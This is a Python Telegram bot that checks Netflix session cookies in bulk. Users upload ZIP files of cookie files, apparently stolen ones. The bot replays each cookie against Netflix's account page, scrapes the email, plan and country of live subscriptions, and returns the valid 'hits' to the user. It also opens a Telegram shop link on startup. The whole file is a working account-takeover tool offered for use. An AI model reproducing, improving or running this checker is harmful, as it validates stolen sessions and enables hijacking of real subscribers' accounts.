import requests, re, time, os, threading, tempfile, zipfile, shutil
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot, webbrowser

webbrowser.open("https://t.me/baroshoping")
init(autoreset=True)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

class NetflixBulkChecker:
    def __init__(self, threads=5):
        self.threads = threads
        self.lock = threading.Lock()
        self.stats = {'total':0, 'checked':0, 'hits':0, 'premium_hits':0, 'bad':0, 'errors':0, 'start_time':time.time()}
        self.premium_accounts = []

    def send_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {'chat_id': self.chat_id, 'text': message, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
            requests.post(url, data=data, timeout=10)
        except: pass

    def get_country_flag(self, code):
        flags = {'US':'🇺🇸','GB':'🇬🇧','DE':'🇩🇪','FR':'🇫🇷','ES':'🇪🇸','IT':'🇮🇹','TR':'🇹🇷','BR':'🇧🇷','JP':'🇯🇵','KR':'🇰🇷','IN':'🇮🇳'}
        return flags.get(code.upper(), '🌍')

    def get_country_name(self, code):
        names = {'US':'United States','GB':'United Kingdom','DE':'Germany','FR':'France','ES':'Spain','IT':'Italy','TR':'Turkey','BR':'Brazil','JP':'Japan','KR':'South Korea','IN':'India'}
        return names.get(code.upper(), code)

    def parse_netscape_cookie(self, text):
        text = text.strip()
        if text.startswith("NetflixId="):
            return {"NetflixId": text.split("NetflixId=", 1)[1].strip()}
        cookies = {}
        for line in text.split('\n'):
            line = line.strip()
            if not line or line.startswith('#'): continue
            parts = line.split('\t')
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]
        return cookies

    def check_cookie(self, cookie_text, source_name):
        try:
            cookies = self.parse_netscape_cookie(cookie_text)
            if not cookies: return None

            session = requests.Session()
            for k, v in cookies.items():
                session.cookies.set(k, v, domain='.netflix.com', path='/')

            r = session.get('https://www.netflix.com/account/membership', timeout=20, allow_redirects=True)
            if 'login' in r.url.lower(): return None

            html = r.text
            if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None

            # Extract basic info
            email = re.search(r'"emailAddress":"([^"]+)"', html)
            plan = re.search(r'localizedPlanName.*?"value":"([^"]+)"', html)
            country = re.search(r'"countryOfSignup":"([^"]+)"', html)

            result = {
                'email': email.group(1) if email else 'Unknown',
                'plan': plan.group(1) if plan else 'Unknown',
                'country_code': country.group(1) if country else 'XX',
                'source': source_name,
                'cookie': '; '.join([f"{k}={v}" for k,v in cookies.items()])
            }
            return result
        except:
            return None

    def process_cookie_file(self, file_path, index):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                text = f.read()
        except:
            with self.lock: self.stats['errors'] += 1
            return

        result = self.check_cookie(text, f"file_{index}")
        with self.lock:
            self.stats['checked'] += 1
            if result:
                self.stats['premium_hits'] += 1
                self.premium_accounts.append(result)
                os.makedirs('hits', exist_ok=True)
                fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
                with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
                    f.write(text)
                print(f"{Fore.GREEN}[✓] HIT: {result['email']} - {result['plan']}{Style.RESET_ALL}")
            else:
                self.stats['bad'] += 1

    def start(self, folder):
        files = [os.path.join(root, f) for root, _, fs in os.walk(folder) for f in fs if f.endswith('.txt')]
        if not files:
            print("No .txt files found!")
            return
        self.stats['total'] = len(files)
        print(f"Starting check... Total files: {len(files)}")

        with ThreadPoolExecutor(max_workers=self.threads) as exe:
            for i, f in enumerate(files, 1):
                exe.submit(self.process_cookie_file, f, i)

        print(f"\n✅ Done! Hits: {self.stats['premium_hits']}")

# ====================== BOT ======================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message, "Send me ZIP file with .txt cookies (one account per file)")

@bot.message_handler(content_types=['document'])
def handle_zip(message):
    if not message.document.file_name.endswith('.zip'):
        bot.reply_to(message, "Please send .zip file")
        return

    bot.reply_to(message, "Processing ZIP...")

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)

        with tempfile.TemporaryDirectory() as tmp:
            zip_path = os.path.join(tmp, "cookies.zip")
            with open(zip_path, "wb") as f:
                f.write(downloaded)

            extract_dir = os.path.join(tmp, "extract")
            os.makedirs(extract_dir, exist_ok=True)
            with zipfile.ZipFile(zip_path, 'r') as z:
                z.extractall(extract_dir)

            checker = NetflixBulkChecker(threads=10)
            checker.chat_id = str(message.chat.id)   # for sending hits
            checker.start(extract_dir)

            # Send hits back
            if os.path.exists("hits") and os.listdir("hits"):
                hits_zip = os.path.join(tmp, "hits.zip")
                with zipfile.ZipFile(hits_zip, 'w') as z:
                    for root, _, fs in os.walk("hits"):
                        for file in fs:
                            z.write(os.path.join(root, file), file)
                with open(hits_zip, "rb") as f:
                    bot.send_document(message.chat.id, f, caption="✅ All Hits Saved!")
                shutil.rmtree("hits", ignore_errors=True)
            else:
                bot.reply_to(message, "No hits found.")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

if __name__ == "__main__":
    print("🚀 Bot Started...")
    bot.remove_webhook()
    bot.infinity_polling(skip_pending=True)
